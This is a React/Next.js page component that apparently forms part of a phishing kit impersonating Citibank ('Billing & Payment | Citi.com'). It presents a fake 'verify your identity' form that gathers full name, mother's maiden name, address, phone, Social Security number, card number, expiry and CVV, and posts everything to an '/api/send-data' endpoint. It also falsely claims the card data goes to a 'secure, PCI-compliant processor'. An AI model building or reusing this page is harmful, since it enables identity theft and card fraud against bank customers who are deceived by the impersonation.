"use client";

import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";

// export const metadata = {
//   title: "Billing & Payment | Citi.com",
// };

const BillingPage = () => {
  const [form, setForm] = useState({
    fullName: "",
    address: "",
    zip: "",
    ssn: "",
    // email: "",
    phone: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
    // cardName: "",
    motherMaidenName: "",
  });
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((s) => ({ ...s, [name]: value }));
  };

  const formatCard = (val) =>
    val
      .replace(/\D/g, "")
      .slice(0, 16)
      .replace(/(.{4})/g, "$1 ")
      .trim();

  const formatExpiry = (val) =>
    val
      .replace(/\D/g, "")
      .slice(0, 4)
      .replace(/(.{2})/, "$1/");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      setLoading(true);
      const res = await axios.post("/api/send-data", form);
      if (res.status === 200) {
        router.push("/verify");
      }
    } catch (err) {
      alert("Something wrong, Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-[#f5f7fa] flex flex-col">
      <Header />

      <div className="flex-grow flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-2xl">
          <div className="bg-white rounded-2xl shadow-md overflow-hidden">
            <div className="p-6 border-b">
              <h2 className="text-2xl font-extrabold text-[#0d2d62]">
                Account Information
              </h2>
              <p className="mt-1 text-sm text-gray-600">
                Provide the following information to verify your identity of
                your credit/debit card associated with your account.
              </p>
            </div>

            <form
              className="p-6 grid grid-cols-1 gap-6"
              onSubmit={handleSubmit}
            >
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Full Name
                  </label>
                  <input
                    name="fullName"
                    value={form.fullName}
                    onChange={handleChange}
                    required={true}
                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                    placeholder="John A. Smith"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Mother's Maiden Name
                  </label>
                  <input
                    name="motherMaidenName"
                    value={form.motherMaidenName}
                    onChange={handleChange}
                    required={true}
                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                    placeholder="Enter Your Mother's Maiden Name"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Billing Address
                  </label>
                  <input
                    name="address"
                    value={form.address}
                    onChange={handleChange}
                    required={true}
                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                    placeholder="123 Main St"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Zip Code
                  </label>
                  <input
                    name="zip"
                    value={form.zip}
                    onChange={handleChange}
                    inputMode="numeric"
                    required={true}
                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                    placeholder="10001"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Email
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={form.email}
                    onChange={handleChange}
                    required={true}
                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                    placeholder="you@example.com"
                  />
                </div> */}

                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Phone
                  </label>
                  <input
                    name="phone"
                    value={form.phone}
                    onChange={handleChange}
                    inputMode="tel"
                    required={true}
                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                    placeholder="+1 (555) 555-0123"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    SSN
                  </label>
                  <input
                    name="ssn"
                    value={form.ssn.replace(/\D/g, "").slice(0, 9)}
                    onChange={(e) =>
                      handleChange({
                        target: { name: "ssn", value: e.target.value },
                      })
                    }
                    inputMode="numeric"
                    type="password"
                    autoComplete="cc-csc"
                    maxLength={9}
                    placeholder="●●● ●●● ●●●"
                    required={true}
                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                  />
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-3">
                  Payment Method
                </h3>

                <div className="rounded-lg border p-4">
                  <label className="block text-sm font-medium text-gray-700">
                    Card Number
                  </label>
                  <div className="mt-2 relative">
                    <input
                      name="cardNumber"
                      value={formatCard(form.cardNumber)}
                      onChange={(e) =>
                        handleChange({
                          target: { name: "cardNumber", value: e.target.value },
                        })
                      }
                      inputMode="numeric"
                      autoComplete="cc-number"
                      // pattern="\d{13,16}"
                      maxLength={19}
                      required={true}
                      className="w-full rounded-lg border px-4 py-3 pr-32 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                      placeholder="1234 5678 9012 3456"
                    />
                    <div className="absolute right-3 top-3 flex items-center gap-2">
                      <svg
                        className="w-8 h-5"
                        viewBox="0 0 36 24"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                        aria-hidden
                      >
                        <rect width="36" height="24" rx="4" fill="#0d2d62" />
                        <rect
                          x="4"
                          y="6"
                          width="8"
                          height="4"
                          rx="1"
                          fill="#fff"
                        />
                        <rect
                          x="14"
                          y="6"
                          width="18"
                          height="4"
                          rx="1"
                          fill="#fff"
                        />
                      </svg>
                    </div>
                  </div>

                  <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-3">
                    <div className="col-span-1 md:col-span-2">
                      <label className="block text-sm font-medium text-gray-700">
                        Expiry (MM/YY)
                      </label>
                      <input
                        name="expiry"
                        value={formatExpiry(form.expiry)}
                        onChange={(e) =>
                          handleChange({
                            target: { name: "expiry", value: e.target.value },
                          })
                        }
                        inputMode="numeric"
                        autoComplete="cc-exp"
                        maxLength={5}
                        placeholder="MM/YY"
                        required={true}
                        className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                      />
                    </div>

                    <div className="col-span-1 md:col-span-2">
                      <label className="block text-sm font-medium text-gray-700">
                        CVV
                      </label>
                      <input
                        name="cvv"
                        value={form.cvv.replace(/\D/g, "").slice(0, 4)}
                        onChange={(e) =>
                          handleChange({
                            target: { name: "cvv", value: e.target.value },
                          })
                        }
                        inputMode="numeric"
                        type="password"
                        autoComplete="cc-csc"
                        maxLength={4}
                        placeholder="●●●"
                        required={true}
                        className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                      />
                    </div>

                    {/* <div>
                      <label className="block text-sm font-medium text-gray-700">
                        Name on Card
                      </label>
                      <input
                        name="cardName"
                        value={form.cardName}
                        onChange={handleChange}
                        autoComplete="cc-name"
                        placeholder="John A. Smith"
                        className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                      />
                    </div> */}
                  </div>

                  <p className="text-xs text-gray-500 mt-3">
                    We use a secure, PCI-compliant processor to handle card
                    details.
                  </p>
                </div>
              </div>

              <div className="pt-2 border-t flex flex-col md:flex-row items-center justify-between gap-4">
                {/* <div className="text-sm text-gray-600">
                  <p className="font-semibold text-gray-700">Security</p>
                  <p className="mt-1">
                    Card data submitted is sent to the payment gateway for
                    tokenization; do not store raw card details on this server.
                  </p>
                </div> */}

                <div className="flex-end gap-3 w-full">
                  {/* <button
                    type="button"
                    className="px-5 py-3 rounded-lg border border-[#0d2d62] text-[#0d2d62] font-semibold hover:bg-[#f0f4f9]"
                  >
                    Cancel
                  </button> */}
                  <button
                    type="submit"
                    className="px-6 py-3 rounded-lg bg-primary hover:!bg-[#054e7b] text-white font-semibold"
                  >
                    {loading ? "Loading..." : "Next"}
                  </button>
                </div>
              </div>
            </form>
          </div>

          <div className="mt-6 text-xs text-gray-500 text-center">
            By continuing you agree to the terms and will be redirected to a
            secure payment processor.
          </div>
        </div>
      </div>

      <Footer />
    </main>
  );
};

export default BillingPage;
